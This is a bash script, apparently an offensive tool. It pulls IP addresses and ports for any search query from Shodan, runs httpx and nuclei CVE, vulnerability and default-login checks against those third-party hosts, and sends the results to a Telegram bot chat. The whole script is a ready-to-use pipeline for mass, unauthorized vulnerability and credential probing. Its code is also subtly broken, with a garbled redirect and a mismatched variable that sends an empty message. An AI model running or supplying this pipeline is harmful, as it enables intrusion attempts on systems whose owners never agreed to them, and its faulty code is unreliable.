echo "Enter the Query: "  
read payload  
for QUERY in $(echo $payload);do mkdir ${QUERY%} > /dev/2 null>&1 ./${QUERY%}/${QUERY%}-VULN > /dev/null 2>&1;
curl -s "https://beta.shodan.io/search/facet?query=$QUERY&facet=ip" | grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' > ./${QUERY%}/${QUERY%}-ip-$(date +%Y-%m-%d).txt;
curl -s "https://beta.shodan.io/search/facet?query=$QUERY&facet=port" | grep -Eo '<strong>[0-9]{1,4}' | tr -d "<strong>" | sed 's/$/, /g' | xargs echo | sed 's/,$//g' | tr -d " "  > ./${QUERY%}/${QUERY%}-port-$(date +%Y-%m-%d).txt;
httpx -silent -follow-redirects -timeout 25 -l ./${QUERY%}/${QUERY%}-ip-$(date +%Y-%m-%d).txt  -p $(cat ./${QUERY%}/${QUERY%}-port-$(date +%Y-%m-%d).txt) | nuclei -timeout 25 -t ~/nuclei-templates/vulnerabilities/  -t ~/nuclei-templates/default-logins/ -t ~/nuclei-templates/cves/ -severity critical,high,medium -t ~/nuclei-templates/default-logins/ -nc -silent -o  ./${QUERY%}/${QUERY%}-VULN/${QUERY%}-VULN.txt;messaget=$(cat ./${QUERY%}/${QUERY%}-VULN/${QUERY%}-VULN.txt);curl -s -X POST https://api.telegram.org/bot5496607758:RAHASIA/sendMessage -d chat_id=-1001410626006 -d text="$message" > /dev/null 2>&1;done 
